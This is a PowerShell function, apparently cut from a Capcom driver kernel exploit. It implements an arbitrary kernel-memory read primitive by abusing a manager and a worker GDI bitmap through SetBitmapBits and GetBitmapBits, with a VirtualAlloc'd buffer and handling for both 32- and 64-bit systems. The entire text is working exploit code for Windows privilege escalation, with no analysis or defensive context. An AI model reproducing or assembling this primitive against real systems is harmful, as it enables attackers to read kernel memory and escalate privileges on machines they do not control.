function Bitmap-Read {
	param ($Address)

	$CallResult = [Capcom]::SetBitmapBits($ManagerBitmap.BitmapHandle, [System.IntPtr]::Size, [System.BitConverter]::GetBytes($Address))
	[IntPtr]$Pointer = [Capcom]::VirtualAlloc([System.IntPtr]::Zero, [System.IntPtr]::Size, 0x3000, 0x40)
	$CallResult = [Capcom]::GetBitmapBits($WorkerBitmap.BitmapHandle, [System.IntPtr]::Size, $Pointer)
	if ($x32Architecture){
		[System.Runtime.InteropServices.Marshal]::ReadInt32($Pointer)
	} else {
		[System.Runtime.InteropServices.Marshal]::ReadInt64($Pointer)
	}
	$CallResult = [Capcom]::VirtualFree($Pointer, [System.IntPtr]::Size, 0x8000)
}